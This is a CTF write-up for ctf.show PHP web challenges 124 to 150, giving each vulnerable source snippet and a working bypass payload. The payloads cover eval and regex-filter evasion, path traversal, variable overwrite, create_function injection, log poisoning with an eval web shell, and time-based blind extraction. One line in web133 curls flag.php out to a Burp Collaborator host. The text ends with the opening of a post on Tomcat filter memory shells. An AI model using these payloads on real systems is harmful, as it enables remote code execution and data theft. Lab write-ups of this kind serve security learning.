if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;\n\n这里有个很坑的点\n\n在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM\n\n也就是说当我面POST  CTF_SHOW.COM时，会自动解析成CTF_SHOW_COM\npayload\nPOST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag\n\n\n\nweb125error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125; \n\n相比于上一题，题目过路的更多了，echo这些打印函数被过滤\n这里我们详细看\n$a=$_SERVER[&#x27;argv&#x27;];\n\n\n$_SERVER[‘argv’]：\n1、cli模式（命令行）下\n第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数\n\n2、web网页模式下\n在web页模式下必须在php.ini开启register_argc_argv配置项\n    \n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n    \n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n    \n$argv,$argc在web模式下不适用\n\n\n我们是在网页模式下的，注意重点：$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句\n\npayload\n?$fl0g=flag_give_me;POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])\n\n另一种思路\n这里没有过滤highlight_file()于是我们可以构造\nfun=highlight_file($_GET[1])\n\npayload\n?1=flag.phpPOST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])\n\n\n\nweb126error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125; \n\n与上题一样，这回多给几个payload\nget: a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])\n\n数组中用加号(加号在url中起到空格的作用)分隔$a[1]对应的就是fl0g=flag_give_me，所以下面这种也是可以的\nget: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])\n\n&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;\n\n\n\nweb127error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123;    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123;    echo $flag;&#125;\n\n\n$_SERVER[&#39;QUERY_STRING&#39;];获取的查询语句是服务端还没url解码的，所以url编码绕过即可：\n\n写个脚本跑一下\n&lt;?phpfunction waf($num)&#123;    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $num))&#123;        return false;    &#125;else&#123;        return true;    &#125;&#125;for($i = 0; $i&lt;129; $i++)&#123;\t$num=chr($i);\tif(waf($num))&#123;\t\techo &quot;未编码：&quot;.$num.&quot;   经过编码：&quot;.urlencode(chr($i)).&quot;\\n&quot;;\t&#125;&#125;?&gt;\n\n空格可以绕过，%20\npayload\n?ctf show=ilove36d\n\n\n\nweb128error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123;    var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;    echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125;\n\n这题我傻了。。，还是看大师傅的wp吧\n考察点是gettext拓展使用\n在开启该拓展后 _() 等效于 gettext()\n&lt;?phpecho gettext(&quot;phpinfo&quot;);结果  phpinfoecho _(&quot;phpinfo&quot;);结果 phpinfo\n\n所以 call_user_func(&#39;_&#39;,&#39;phpinfo&#39;) 返回的就是phpinfo\n因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars\nget_defined_vars ( void ) : array此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\n\npayload\n?f1=_&amp;f2=get_defined_vars\n\n\n\nweb129error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123;    $f = $_GET[&#x27;f&#x27;];    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;        echo readfile($f);    &#125;&#125;\n\n路径穿越很简单\n../   回到上一级目录\n./    表示当前目录\npayload\n?f=../../ctfshow../../../var/www/html/flag.php\n\n\n\nweb130error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = $_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125; \n\n\npreg_match不识别数组，否则返回false，匹配一次返回1，没有返回0\nif(0 &#x3D;&#x3D;&#x3D; flase)返回值为false0不是强等于false的\nstripos()函数对数组不识别，遇到数组会返回null，null!&#x3D;&#x3D;flase\n\n在&#x2F;s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f&#x3D;ctfshow就可以了\npayload\n?f=ctfshow[]?f[]=1?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)\n\n下面就要介绍p神的PCRE回溯\n\nhttps://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));的方式查看当前环境下的上限：\n我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。\n脚本\nimport requestsurl=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;data=&#123;    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text)\n\n\n\nweb131error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = (String)$_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125; \n\n老老实实用PCRE回溯吧\nweb132扫出&#x2F;admin\ninclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125; \n\n这题的突破点在于\nif($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)\n\n&lt;?phpif(false &amp;&amp; false || true)&#123;\techo &quot;true!&quot;;&#125;else&#123;    echo &quot;false!&quot;;&#125;?&gt;//返回结果为true\n\npayload\n?code=admin&amp;password=admin&amp;username=admin\n\n\n\nweb133error_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;\n\nget传参   F=`$F `;sleep 3经过substr($F,0,6)截取后 得到  `$F `;也就是会执行 eval(&quot;`$F `;&quot;);我们把原来的$F带进去eval(&quot;``$F `;sleep 3`&quot;);也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);前面的命令我们不需要管，但是后面的命令我们可以自由控制。这样就在服务器上成功执行了 sleep 3所以 最后就是一道无回显的RCE题目了\n\n无回显我们可以用反弹shell 或者curl外带 或者盲注 这里的话反弹没有成功，但是可以外带。\ncurl  http://xxx:4567?p=`tac f*`\n\n当然要是没有公网ip的话，bp也可以帮到我们这个忙\npayload\n/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;\n\n\n\nweb134$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;    die(file_get_contents(&#x27;flag.php&#x27;));&#125;\n\n用extract进行变量覆盖\n测试一下\nparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);//然后我们传入 _POST[‘a’]=123会发现输出的结果为array(1) &#123; [&quot;‘a’&quot;]=&gt; string(3) “123” &#125;也就是说现在的$_POST[‘a’]存在并且值为123\n\npayload\n?_POST[key1]=36d&amp;_POST[key2]=36d\n\n\n\nweb135highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);    &#125;&#125;\n\npayload\n?F=`$F` ;cp flag.php 2.txt;?F=`$F` ;uniq flag.php&gt;4.txt;\n\n\n\nweb136 &lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n虽然过滤了很多，但是在linux中我们可以用tee写文件\npayload\nls|tee 1.txtls / |tee 1.txtcat /f* |1.txt\n\n\n\nweb137highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); \n\n很简单，直接调用ctfshow类里的getFlag方法\nPOST:ctfshow=ctfshow::getFlag\n\n借用yu22x师傅的拓展\n\nphp中 -&gt;与:: 调用类中的成员的区别-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法.\n也就是说双冒号可以不用实例化类就可以直接调用类中的方法\n\nweb138highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);\n\n相比于上一题，这个题过滤了冒号\ncall_user_func中不但可以传字符串也可以传数组\n本地测试\ncall_user_func(array($classname, &#x27;say_hello&#x27;));这时候会调用 classname中的 say_hello方法\n\npayload\nctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n\n\n\nweb139 &lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n只能盲打咯\n脚本\nimport requestsimport timeimport stringstr=string.digits+string.ascii_lowercase+&quot;-&quot;result=&quot;&quot;key=0for j in range(1,45):    print(j)    if key==1:        break    for n in str:        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)        #print(payload)        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload        try:            requests.get(url,timeout=(2.5,2.5))        except:            result=result+n            print(result)            break\n\n\n\nweb140highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;    $f1 = (String)$_POST[&#x27;f1&#x27;];    $f2 = (String)$_POST[&#x27;f2&#x27;];    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;            $code = eval(&quot;return $f1($f2());&quot;);            if(intval($code) == &#x27;ctfshow&#x27;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125;\n\nif(intval($code) == &#x27;ctfshow&#x27;)\n\n这里进行的是弱比较,可以用null绕过\n$code = eval(&quot;return $f1($f2());&quot;); \n\nintval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0\n\npayload\nmd5(phpinfo())md5(sleep())md5(md5())current(localeconv)sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1\n\n实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件\nweb141highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125; \n\n/^\\W+$/ 作用是匹配非数字字母下划线的字符,\n看看下面这句话\neval(&quot;return 1;phpinfo();&quot;);\n\n显然这里的phpinfo()是不执行的，但数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。\neval(&quot;return 1-phpinfo();&quot;);//可以执行\n\npayload\nv1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1\n\n\n\nweb142error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    if(is_numeric($v1))&#123;        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125; \n\n这里我们令v1=0就可以让$d=0\nweb143highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\n过滤了加减，我们可以用乘除，过滤了取反我们可以用异或\npayload\nv1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1\n\n\n\nweb144highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)===1?true:false;&#125;\n\n与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了\npayload\n?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\n\n\n\nweb155highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\n看了yu22x师傅的wp，妙！\neval(&quot;return 1?phpinfo():1;&quot;);\n\n这里考察了三目运算符，这里是可以执行phpinfo()的\n?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1\n\n这样可以执行phpinfo()\npayload\n?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1\n\n\n\nweb146highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125; \n\n过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符\neval(&quot;return 1==phpinfo()||1;&quot;);\n\n这里可以执行phpinfo()\npayload\n?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1\n\n\n\nweb147highlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123;    $ctfshow = $_POST[&#x27;ctf&#x27;];    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);    &#125;&#125;\n\n不会，还是老老实实看wp吧。\n考察点：create_function()代码注入\ncreate_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123;  echo $a.&quot;123&quot;;&#125;\n\n那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F; 就等价于\nfunction f($a) &#123;  echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令fuzz后发现%5c可以绕过这个正则表达式\n\npayload\nget: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//post: ctf=%5ccreate_function\n\n\n\nweb148include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;\n\n未过滤异或，直接构造\npayload\n?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);\n\n\n\nweb149error_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;\n\n非预期\n往index.php直接写马，然后蚁剑连接即可\n预期解\n文件竞争，一个负责一直写文件，一个负责一直读文件\nweb150include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip = 0;        $this-&gt;secret = $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;\n\n日志绕过\nPOST /?isVIP=1 HTTP/1.1Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.showUser-Agent: &lt;?php eval($_POST[1]);?&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: _ga=GA1.2.1418869291.1680592508Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 49ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);\n\n\n\nweb150_plusinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip = 0;        $this-&gt;secret = $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;    include($ctf);&#125;\n\n过滤了log，不能日志包含绕过了\n\n这个题一点点小坑__autoload()函数不是类里面的__autoload — 尝试加载未定义的类最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo接下来就去getshell啦\n\npayload\n/?..CTFSHOW..=phpinfo\n\nphp变量不能含有点空格，遇到这些会自动转化为下划线\n\n总算是写完啦，不过这永远不是终点…\n","categories":["学习"]},{"title":"Tomcat内存马—Filter型","url":"/2023/06/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Filter%E5%9E%8B/","content":"FilterFilter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 